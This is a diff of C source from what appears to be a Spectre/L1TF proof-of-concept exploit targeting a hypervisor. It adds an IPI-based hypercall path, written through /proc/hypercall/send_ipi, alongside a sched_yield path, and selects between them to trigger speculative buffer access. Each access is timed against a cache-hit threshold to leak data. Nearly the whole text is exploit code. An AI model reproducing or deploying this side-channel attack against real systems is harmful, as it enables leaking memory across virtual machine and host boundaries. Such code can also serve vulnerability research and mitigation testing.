@@ -17,8 +17,25 @@
 #include "l1tf.h"
 #include "time_deque.h"
 
-int hypercall(struct sched_yield_hypercall *opts) {
+int hypercall_yield(void *raw_opts) {
+  struct sched_yield_hypercall *opts = raw_opts;
   const char *hypercall_path = "/proc/hypercall/sched_yield";
+  int fd = open(hypercall_path, O_WRONLY);
+  if (fd < 0) {
+    err(fd, "Failed to open %s", hypercall_path);
+  }
+
+  int b = write(fd, opts, sizeof(*opts));
+  close(fd);
+  if (b < 0) {
+    err(errno, "Failed to write to %s", hypercall_path);
+  }
+  return b;
+}
+
+int hypercall_ipi(void *raw_opts) {
+  struct send_ipi_hypercall *opts = raw_opts;
+  const char *hypercall_path = "/proc/hypercall/send_ipi";
   int fd = open(hypercall_path, O_WRONLY);
   if (fd < 0) {
     err(fd, "Failed to open %s", hypercall_path);
@@ -41,20 +58,52 @@ size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_ad
   return (phys_page_addr - phys_map_addr) / 8;
 }
 
+enum half_spectre_method {
+  METHOD_IPI,
+  METHOD_YIELD,
+};
+static const enum half_spectre_method method = METHOD_IPI;
+
 size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
   unsigned int cpu = 0;
-  if (getcpu(&cpu, NULL) == -1) {
-    err(EXIT_FAILURE, "Failed to get CPU");
-  }
+  struct send_ipi_hypercall opts_ipi;
+  struct sched_yield_hypercall opts_yield;
+  void *opts_ptr;
+  int (*hypercall)(void *opts);
 
-  struct sched_yield_hypercall opts = {.current_cpu_id = cpu, .speculated_cpu_id = idx, .ptr = buf};
+  switch (method) {
+  case METHOD_YIELD:
+    if (getcpu(&cpu, NULL) == -1) {
+      err(EXIT_FAILURE, "Failed to get CPU");
+    }
+
+    opts_yield.current_cpu_id = cpu;
+    opts_yield.speculated_cpu_id = idx;
+    opts_yield.ptr = buf;
+    opts_ptr = &opts_yield;
+    hypercall = &hypercall_yield;
+    break;
+  case METHOD_IPI:
+    opts_ipi.real.mask_low = -1;
+    opts_ipi.real.mask_high = -1;
+    opts_ipi.real.min = 0;
+    opts_ipi.mispredicted.mask_low = -1;
+    opts_ipi.mispredicted.mask_high = -1;
+    opts_ipi.mispredicted.min = idx;
+    opts_ipi.ptr = buf;
+
+    opts_ptr = &opts_ipi;
+    hypercall = &hypercall_ipi;
+    break;
+  default:
+    err(EXIT_FAILURE, "Unknown method type");
+  }
 
   size_t min = -1;
   for (size_t i = 0; i < iters; ++i) {
-    size_t time = hypercall(&opts);
+    size_t time = hypercall(opts_ptr);
     if (time < CACHE_HIT_THRESHOLD) {
       return time;
-      // printf("iter %ld\ttime %ld\n", i, time);
     }
     min = time < min ? time : min;
   }
